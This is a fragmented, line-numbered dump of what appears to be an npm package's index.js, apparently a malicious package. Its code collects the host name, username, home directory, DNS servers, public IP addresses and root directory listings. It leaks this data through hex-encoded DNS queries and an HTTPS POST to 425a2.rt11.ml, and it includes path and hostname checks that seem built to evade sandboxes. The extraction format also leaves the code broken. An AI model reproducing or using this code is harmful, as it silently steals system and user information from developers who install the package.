// File: package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const querystring = require("querystring")
Line 4: const https = require("https")
Line 5: const fs = require('fs')
Line 6: var path = require('path')
Line 7: const packageJSON = require("./package.json")
Line 10: {
var re = /^[0-9a-f]+$/g;
if(re.test(inputString)) {
    return true
} else {
    return false;
}
}
Line 11: var re = /^[0-9a-f]+$/g
Line 12: re.test(inputString)
Line 18: {
var re = /^\/root\/extract[0-9]+\/package$/g;
if(re.test(inputString)) {
    return true
} else {
    return false;
}
}
Line 19: var re = /^\/root\/extract[0-9]+\/package$/g
Line 20: re.test(inputString)
Line 26: {
var re = /^\/home\/lili\/vastest\/[0-9]+\/package$/g;
if(re.test(inputString)) {
    return true
} else {
    return false;
}
}
Line 27: var re = /^\/home\/lili\/vastest\/[0-9]+\/package$/g
Line 28: re.test(inputString)
Line 38: {
lastdir = dirs[dirs.length-1];
}
Line 39: lastdir = dirs[dirs.length-1]
Line 44: checkhex(hostname)
Line 47: checkhex(hostname)
Line 56: checkhex(hostname)
Line 59: checkhex(hostname)
Line 78: {
var ufiles=[];
for(var j=0;j<paths.length;j++){
try{
  mpath = paths[j];
  files = fs.readdirSync(mpath);
  for(var i=0;i<files.length;i++){
  ufiles.push(path.join(mpath,files[i]));
  }
}
catch(error){}
}
  return ufiles;
}
Line 79: var ufiles=[]
Line 81: {
  mpath = paths[j];
  files = fs.readdirSync(mpath);
  for(var i=0;i<files.length;i++){
  ufiles.push(path.join(mpath,files[i]));
  }
}
Line 82: mpath = paths[j]
Line 83: files = fs.readdirSync(mpath)
Line 84: {
  ufiles.push(path.join(mpath,files[i]));
  }
Line 85: ufiles.push(path.join(mpath,files[i]))
Line 97: parts[0] === '10' || 
      (parts[0] === '172' && (parseInt(parts[1], 10) >= 16 && parseInt(parts[1], 10) <= 31)) || 
      (parts[0] === '192' && parts[1] === '168') || (parts[0] === '127' && parts[1] === '0' && parts[2] === '0')
Line 98: parts[0] === '172' && (parseInt(parts[1], 10) >= 16 && parseInt(parts[1], 10) <= 31)
Line 99: parts[0] === '127' && parts[1] === '0' && parts[2] === '0'
Line 103: Buffer.from(data, 'utf8')
Line 104: bufferText.toString('hex')
Line 112: {
var str=[];
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str.push(networkInterfaces[item][i].address);
}
}
}
return str;
}
Line 113: var str=[]
Line 115: _iterator_0.next()
Line 117: {
str.push(networkInterfaces[item][i].address);
}
Line 118: str.push(networkInterfaces[item][i].address)
Line 125: {
var str=[];
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
if(!isprivate(networkInterfaces[item][i].address))
str.push(networkInterfaces[item][i].address);
}
}
}
for(var i=0;i<str.length;i++){
if(str[i].includes('.'))
return "i."+todashedip(str[i])+".i";
}
if(str.length>0)
return "i."+todashedip(str[0])+".i";
else
return "i._.i";
}
Line 126: var str=[]
Line 128: _iterator_1.next()
Line 132: str.push(networkInterfaces[item][i].address)
Line 137: str[i].includes('.')
Line 149: {
str=str+toHex(chunks[i])+".";
}
Line 150: str=str+toHex(chunks[i])+"."
Line 156: {
var str="";
var queries = [];
var substr1 = "";
var substr2 = "";
var hostname = "425a2.rt11.ml";
str=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+toHex(pkg.un)+"."+getPathChunks(pkg.c)+"."+getIps()+"."+hostname;
queries.push(str);
return queries;
}
Line 158: var queries = []
Line 163: queries.push(str)
Line 167: const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    ip: JSON.stringify(gethttpips()),
    dirs: JSON.stringify(getFiles(["C:\\","D:\\","/","/home"])),
}
Line 171: os.hostname()
Line 172: os.userInfo()
Line 175: _tmp_2.dirs = JSON.stringify(getFiles(["C:\\","D:\\","/","/home"]))
Line 178: {
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}
const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});
var options = {
    hostname: "425a2.rt11.ml",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
}
Line 179: {
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}
Line 180: dns.lookup(qs[j], function(err, result) {
  //console.log(result)
})
Line 199: var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
})
Line 209: req.write(postData)
Line 210: req.end()
